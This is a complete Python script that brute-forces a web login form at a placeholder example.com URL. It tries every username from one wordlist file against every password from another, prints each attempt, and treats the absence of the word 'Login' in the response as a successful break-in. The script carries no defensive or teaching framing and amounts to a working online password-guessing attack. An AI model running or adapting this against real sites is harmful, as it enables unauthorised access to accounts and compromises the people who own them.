import requests

# Set the login URL
login_url = 'https://www.example.com/login.html'

# Open the username file in read mode
with open('path/to/username/file.txt', 'r') as username_file:
  # Read the usernames from the file, one line at a time
  for username in username_file:
    # Remove the newline character from the end of the username
    username = username.strip()

    # Open the password file in read mode
    with open('path/to/password/file.txt', 'r') as password_file:
      # Read the passwords from the file, one line at a time
      for password in password_file:
        # Remove the newline character from the end of the password
        password = password.strip()

        # Set the login payload with the current username and password
        payload = {'username': username, 'password': password}

        # Send an HTTP POST request to the login URL with the login payload
        response = requests.post(login_url, data=payload)

        # Display the length of the response for each login attempt
        print(f"Length of response: {len(response.text)} (Username: {username}, Password: {password})")

        # Check if the login was successful by searching for the absence of the keyword "Login" in the HTML
        if "Login" not in response.text:
          print(f"Success! Username: {username}, Password: {password}")
          break
      else:
        # If the inner loop completed without breaking, the password was incorrect
        continue
      #
